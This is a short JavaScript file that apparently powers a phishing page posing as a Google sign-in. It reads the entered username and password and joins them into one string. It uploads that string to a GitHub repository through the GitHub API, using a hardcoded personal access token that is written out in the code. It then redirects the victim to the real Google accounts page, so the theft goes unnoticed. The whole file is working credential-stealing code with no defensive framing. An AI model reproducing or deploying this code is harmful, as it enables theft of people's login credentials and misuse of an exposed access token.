async function login() {

    const myselect = document.getElementById("usrn");    
    const pwd = document.getElementById("pwd");
    
    if (!myselect.value.trim() || !pwd.value.trim()) {
        return;
    }
    
    const bismuth = `${myselect.value} |__| ${pwd.value}`;
    const data = { message: bismuth };
    
    const owner = "GregUpload";
    const repo = "Google";
    const token = "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";
    const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
    
    const path = `udata/data_${timestamp}.json`;
    const url = `https://api.github.com/repos/${owner}/${repo}/contents/${path}`;
    const body = {
        message: `Ajout du fichier ${path}`,
        content: btoa(JSON.stringify(bismuth))
    };
    
    try {
        const response = await fetch(url, {
            method: "PUT",
            headers: {
                "Authorization": `token ${token}`,
                "Accept": "application/vnd.github+json",
                "Content-Type": "application/json"
            },
            body: JSON.stringify(body)
        });

        if (!response.ok) {
            const error = await response.json();
            console.error("");
            return;
        }

        const result = await response.json();
        console.log("");
    } catch (err) {
        console.error("");
    }
    setTimeout(() => {
        location.replace("https://accounts.google.com");
        }, 1500);
    
}